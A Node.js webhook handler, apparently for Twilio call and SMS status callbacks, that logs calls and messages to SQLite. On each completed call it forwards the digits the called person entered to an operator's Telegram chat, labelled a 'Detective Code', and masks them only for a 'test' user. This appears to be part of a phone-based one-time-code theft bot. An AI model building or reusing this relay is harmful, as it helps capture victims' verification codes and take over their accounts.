module.exports = function(request, response) {
/**
 * Import required dependencies
 */
const axios = require('axios'); // For making HTTP requests
const sqlite3 = require('sqlite3').verbose(); // For interacting with the SQLite database
const config = require('.././config'); // Import configuration file

    /**
     * Initialize the SQLite database
     */
    const db = new sqlite3.Database('./db/data.db');

    /**
     * Retrieve variables from the request body
     */
    var itsfrom = request.body.From || null; // Sender's phone number
    var itsto = request.body.To || null; // Receiver's phone number
    var sid = request.body.CallSid; // Call SID (unique identifier for calls)
    var date = Date.now(); // Current timestamp
    var status; // Status of the call or SMS
    var table = null; // Database table to use (calls or sms)
    var sidname = null; // Column name for the SID (callSid or smssid)

    /**
     * Determine if the request is for a call or SMS
     */
    if (sid !== undefined) {
        status = request.body.CallStatus; // Status of the call
        table = 'calls'; // Use the calls table
        sidname = 'callSid'; // Column name for call SID
    } else {
        sid = request.body.SmsSid; // SMS SID (unique identifier for SMS)
        status = request.body.SmsStatus; // Status of the SMS
        table = 'sms'; // Use the sms table
        sidname = 'smssid'; // Column name for SMS SID
    }

    /**
     * Validate that all required data is present
     */
    if (!itsfrom || !itsto || !sid) {
        return response.status(200).json({ error: 'Please send all the needed post data.' });
    }

    /**
     * Check if the SID already exists in the database
     */
    db.get(`SELECT ${sidname} FROM ${table} WHERE ${sidname} = ?`, [sid], (err, row) => {
        if (err) return console.log(err.message);

        if (!row) {
            /**
             * If the SID does not exist, insert a new record into the database
             */
            db.run(
                `INSERT INTO ${table} (itsfrom, itsto, status, ${sidname}, date) VALUES (?, ?, ?, ?, ?)`,
                [itsfrom, itsto, status, sid, date],
                function(err) {
                    if (err) return console.log(err.message);
                    return response.status(200).json({ inserted: 'All is alright.' });
                }
            );
        } else {
            /**
             * If the SID exists, update the existing record in the database
             */
            db.run(
                `UPDATE ${table} SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE ${sidname} = ?`,
                [status, itsfrom, itsto, date, sid],
                function(err) {
                    if (err) return console.log(err.message);

                    /**
                     * If the status is "completed" and the table is "calls",
                     * send a notification via Telegram
                     */
                    if (table === 'calls' && status === 'completed' && config.telegramBotToken && config.telegramChatId) {
                        db.get('SELECT * FROM calls WHERE callSid = ?', [sid], (err, row) => {
                            if (err) return console.error(err.message);

                            let message;
                            /**
                             * If no digits were entered, notify that the user did not respond
                             */
                            if (!row.digits) {
                                message = `📱 Mobile Phone: ${itsto}\n📶 Detective Status: The user didn’t respond or enter the code.`;
                            } else {
                                /**
                                 * Mask the code if the user is "test", otherwise display it
                                 */
                                let code = row.user === 'test' ? row.digits.slice(0, 3) + '***' : row.digits;
                                message = `📱 Mobile Phone: ${itsto}\n📶 Detective Code: **${code}**`;
                            }

                            /**
                             * Send the notification to Telegram
                             */
                            sendTelegramNotification(message);
                        });
                    }

                    return response.status(200).json({ inserted: 'All is alright.' });
                }
            );
        }
    });

    /**
     * Function to send a notification to Telegram
     * @param {string} message - The message to send
     */
    function sendTelegramNotification(message) {
        const telegramUrl = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`;

        axios.post(telegramUrl, {
            chat_id: config.telegramChatId,
            text: message,
            parse_mode: 'Markdown'
        }).then((response) => {
            console.log('Telegram notification sent successfully:', response.data);
        }).catch((error) => {
            console.error('Telegram API Error:', error.response ? error.response.data : error.message);
        });
    }
};
